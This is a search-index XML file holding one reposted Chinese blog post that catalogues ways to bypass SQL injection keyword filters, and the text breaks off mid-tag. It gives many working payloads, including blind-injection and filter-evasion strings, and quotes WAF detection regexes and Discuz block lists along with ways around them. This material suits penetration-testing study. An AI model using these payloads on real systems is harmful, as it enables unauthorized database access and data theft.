<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sql注入绕过</title>
    <link href="/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>转载并修改自 <a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87-1">链接</a></p><h1 id="SQL注入针对关键字过滤的绕过技巧"><a href="#SQL注入针对关键字过滤的绕过技巧" class="headerlink" title="SQL注入针对关键字过滤的绕过技巧"></a>SQL注入针对关键字过滤的绕过技巧</h1><p>在SQL注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p><span id="more"></span><blockquote><p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加SQL注入过滤和检测的几种思路和绕过方法</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><h3 id="使用注释符-绕过"><a href="#使用注释符-绕过" class="headerlink" title="使用注释符/**/绕过"></a>使用注释符<code>/**/</code>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>name<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><br></code></pre></td></tr></table></figure><h3 id="使用url编码绕过"><a href="#使用url编码绕过" class="headerlink" title="使用url编码绕过"></a>使用<strong>url编码</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span>a0 发出去就是空格的意思，但是需要在burp中抓包后修改<br></code></pre></td></tr></table></figure><h3 id="使用浮点数绕过"><a href="#使用浮点数绕过" class="headerlink" title="使用浮点数绕过"></a>使用<strong>浮点数</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8E0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8.0</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="使用Tab替代空格"><a href="#使用Tab替代空格" class="headerlink" title="使用Tab替代空格"></a>使用<strong>Tab</strong>替代空格</h3><h3 id="使用两个空格替代一个空格"><a href="#使用两个空格替代一个空格" class="headerlink" title="使用两个空格替代一个空格"></a>使用<strong>两个空格</strong>替代一个空格</h3><h3 id="使用括号绕过"><a href="#使用括号绕过" class="headerlink" title="使用括号绕过"></a>使用<strong>括号</strong>绕过</h3><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>(<span class="hljs-keyword">user</span>())<span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-keyword">and</span>(<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span>(sleep(ascii(mid(database()<span class="hljs-keyword">from</span>(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span>(<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">109</span>))<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><h3 id="使用16进制绕过"><a href="#使用16进制绕过" class="headerlink" title="使用16进制绕过"></a>使用<strong>16进制</strong>绕过</h3><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条SQL语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的SQL语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><h3 id="使用from关键字绕过"><a href="#使用from关键字绕过" class="headerlink" title="使用from关键字绕过"></a>使用<strong>from关键字</strong>绕过</h3><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> mid(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h3 id="使用join关键字绕过"><a href="#使用join关键字绕过" class="headerlink" title="使用join关键字绕过"></a>使用<strong>join关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br>等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure><h3 id="使用like关键字绕过"><a href="#使用like关键字绕过" class="headerlink" title="使用like关键字绕过"></a>使用<strong>like关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ascii(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">80</span>   #等价于<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;r%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用offset关键字绕过"><a href="#使用offset关键字绕过" class="headerlink" title="使用offset关键字绕过"></a>使用<strong>offset关键字</strong>绕过</h3><p>对于limit可以使用offset来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="过滤注释符（-和-）"><a href="#过滤注释符（-和-）" class="headerlink" title="过滤注释符（ # 和 -- ）"></a>过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2><h3 id="手动闭合引号，不使用注释符"><a href="#手动闭合引号，不使用注释符" class="headerlink" title="手动闭合引号，不使用注释符"></a>手动闭合引号，不使用注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3||&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,&#x27;</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="过滤比较符号-（-）"><a href="#过滤比较符号-（-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2><h3 id="使用-greatest-、least（）函数-绕过"><a href="#使用-greatest-、least（）函数-绕过" class="headerlink" title="使用**greatest()、least（）函数**绕过"></a>使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3><p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p><p>最常见的一个盲注的SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p><p>那么上面的这条SQL语句可以使用greatest变为如下的子句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><h3 id="使用-between-and-绕过"><a href="#使用-between-and-绕过" class="headerlink" title="使用**between and**绕过"></a>使用**<code>between</code> <code>and</code>**绕过</h3><p>between a and b：返回a，b之间的数据，不包含b。</p><h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ <code>=</code> ）</h2><h3 id="使用like-、rlike-、regexp-或者-使用-或者"><a href="#使用like-、rlike-、regexp-或者-使用-或者" class="headerlink" title="使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;"></a>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3><h2 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="headerlink" title="过滤or and xor not"></a>过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2><h3 id="使用符号代替"><a href="#使用符号代替" class="headerlink" title="使用符号代替"></a>使用符号代替</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">=</span>`<span class="hljs-operator">&amp;&amp;</span>`  <span class="hljs-keyword">or</span><span class="hljs-operator">=</span>`<span class="hljs-operator">||</span>`   xor<span class="hljs-operator">=</span>`<span class="hljs-operator">|</span>`   <span class="hljs-keyword">not</span><span class="hljs-operator">=</span>`<span class="hljs-operator">!</span>`<br></code></pre></td></tr></table></figure><h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2><h3 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用<strong>大小写</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UnIoN/**/SeLeCT</span><br></code></pre></td></tr></table></figure><h3 id="使用内联注释绕过"><a href="#使用内联注释绕过" class="headerlink" title="使用内联注释绕过"></a>使用<strong>内联注释</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></td></tr></table></figure><h3 id="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"><a href="#使用双关键字绕过（若删除掉第一个匹配的union就能绕过）" class="headerlink" title="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"></a>使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></code></pre></td></tr></table></figure><h3 id="使用加号-拆解字符串"><a href="#使用加号-拆解字符串" class="headerlink" title="使用加号+拆解字符串"></a>使用<strong>加号+拆解字符串</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> ‘swords’ <span class="hljs-operator">=</span>‘sw’ <span class="hljs-operator">+</span>’ ords’ ；<span class="hljs-keyword">EXEC</span>(‘<span class="hljs-keyword">IN</span>’ <span class="hljs-operator">+</span>’ SERT <span class="hljs-keyword">INTO</span> ‘<span class="hljs-operator">+</span>’ …..’ )<br></code></pre></td></tr></table></figure><h3 id="使用语法新特性绕过屏蔽select"><a href="#使用语法新特性绕过屏蔽select" class="headerlink" title="使用语法新特性绕过屏蔽select"></a>使用语法新特性绕过屏蔽select</h3><p>在MySQL 8.0.19版本后，MySQL推出了一些新特性，使我们可以不使用select就能够取数据</p><h4 id="TABLE-语句"><a href="#TABLE-语句" class="headerlink" title="TABLE 语句"></a>TABLE 语句</h4><p>可以直接列出表的全部内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]<br></code></pre></td></tr></table></figure><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p><h4 id="VALUES-语句"><a href="#VALUES-语句" class="headerlink" title="VALUES 语句"></a>VALUES 语句</h4><p>可以列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> row_constructor_list [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_designator] [LIMIT <span class="hljs-keyword">BY</span> number]<br><br>row_constructor_list:<br> <span class="hljs-type">ROW</span>(value_list)[, <span class="hljs-type">ROW</span>(value_list)][, ...]<br><br>value_list:<br> <span class="hljs-keyword">value</span>[, <span class="hljs-keyword">value</span>][, ...]<br><br>column_designator:<br> column_index<br></code></pre></td></tr></table></figure><p>例如直接列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>), <span class="hljs-type">ROW</span>(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);<br></code></pre></td></tr></table></figure><blockquote><p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p></blockquote><h2 id="使用编码绕过过滤"><a href="#使用编码绕过过滤" class="headerlink" title="使用编码绕过过滤"></a>使用<strong>编码</strong>绕过过滤</h2><p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p><p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p><h2 id="使用等价函数绕过过滤"><a href="#使用等价函数绕过过滤" class="headerlink" title="使用等价函数绕过过滤"></a>使用<strong>等价函数</strong>绕过过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br><br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br><br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br><br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br><br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br><br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br><br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br><br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="补充：进行过滤的几种思路"><a href="#补充：进行过滤的几种思路" class="headerlink" title="补充：进行过滤的几种思路"></a>补充：进行过滤的几种思路</h2><h3 id="黑名单字符替换"><a href="#黑名单字符替换" class="headerlink" title="黑名单字符替换"></a>黑名单字符替换</h3><p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p><p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>在一些waf或者cms会见到类似如下的防护代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confi</span><br><span class="hljs-string">rm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)</span><br><span class="hljs-string">\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;</span><br><span class="hljs-string">|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\(|@&#123;1</span><br><span class="hljs-string">,2&#125;\w+?\s*|\s+?.+?|.*(`|&#x27;|\&quot;).+(`|&#x27;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&#x27;|\&quot;).*?(`|&#x27;|\&quot;)\s*)SET|INSER</span><br><span class="hljs-string">T\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s</span><br><span class="hljs-string">select|\bunion\b|select\s.+?&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p><p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p><p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p><p>例如discuz的防护代码 <code>_do_query_safe</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dfunction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;load_file&#x27;</span>,<span class="hljs-string">&#x27;hex&#x27;</span>,<span class="hljs-string">&#x27;substring&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;daction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;intooutfile&#x27;</span>,<span class="hljs-string">&#x27;intodumpfile&#x27;</span>,<span class="hljs-string">&#x27;unionselect&#x27;</span>,<span class="hljs-string">&#x27;(select&#x27;</span>, <span class="hljs-string">&#x27;un</span><br><span class="hljs-string">ionall&#x27;</span>, <span class="hljs-string">&#x27;uniondistinct&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dnote&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/*&#x27;</span>,<span class="hljs-string">&#x27;*/&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>...<br><span class="hljs-variable">$clean</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-z0-9_\-\(\)#\*\/\&quot;]+/is&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$clean</span>));<br>...<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$fun</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$clean</span>, <span class="hljs-variable">$fun</span> . <span class="hljs-string">&#x27;(&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-1&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码首先将SQL语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p><p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> test3<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> substr(test2,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者可以使用多语句的方式执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d2074657374</span>;<br><span class="hljs-keyword">prepare</span> s <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">execute</span> s;<br></code></pre></td></tr></table></figure><p>也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler <span class="hljs-keyword">user</span> <span class="hljs-keyword">open</span>;<br>handler <span class="hljs-keyword">user</span> read <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><h3 id="语义分析"><a href="#语义分析" class="headerlink" 